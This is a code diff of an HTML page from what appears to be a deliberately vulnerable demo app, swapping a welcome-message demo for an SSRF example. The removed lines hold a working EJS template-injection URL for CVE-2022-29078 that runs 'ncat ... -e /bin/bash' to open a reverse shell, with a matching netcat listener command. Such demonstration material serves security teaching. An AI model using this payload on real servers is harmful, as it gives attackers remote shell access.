@@ -28,31 +28,15 @@
   
       <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">
         <div class="card-body">
-          <p>This page accept a single query parameter "id" and when you provide it, it it used to change the welcome message.</p>
-          <p>For example passing <code>?id=David</code> will display <i>Hello David !</i> at the top of this page.</p>
+          <p>The below link sends a remote URL as an input to the parameter <Strong>myURL</Strong>.</p>
+          <p>Passing a remote URL to the server may be used to execute an SSRF (Server-side Request Forgery) invocation causing a remote code to run on the server</p>
           <a href="/uploadPath?myURL=https://raw.githubusercontent.com/jfrog/project-examples/master/README"> Try it !</a>
         </div>
       </div>
     </div>
     <div class="card">
       <div class="card-header" id="headingTwo">
-        <h2 class="mb-0">
-          <button class="btn btn-link collapsed" type="button" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
-            CVE-2022-35949 ?
-          </button>
-        </h2>
-      </div>
-      <div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordionExample">
-        <div class="card-body">
-          <p>Now the idea is to exploit CVE-2022-29078 to create a remote shell, by executing the following command in the container<br/>
-          <code>ncat host.docker.internal 1337 -e /bin/bash</code></p>
-          <p>So we will use this url : <br/>
-            <code>http://localhost:3000/?id=David&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27ncat%20host.docker.internal%201337%20-e%20/bin/bash%27);s</code></p>
-          <p>And before activating the exploit server side, you just need to listen for an incoming connection
-                        <code>nc -l 1337</code></p>
-          </p>
-            <p><a href="/?id=David&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27ncat%20host.docker.internal%201337%20-e%20/bin/bash%27);s">Try it ! </a></p>
-          </div>
+        <a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2022-35949"> What is CVE-2022-35949 ?</a>
       </div>
     </div>
 
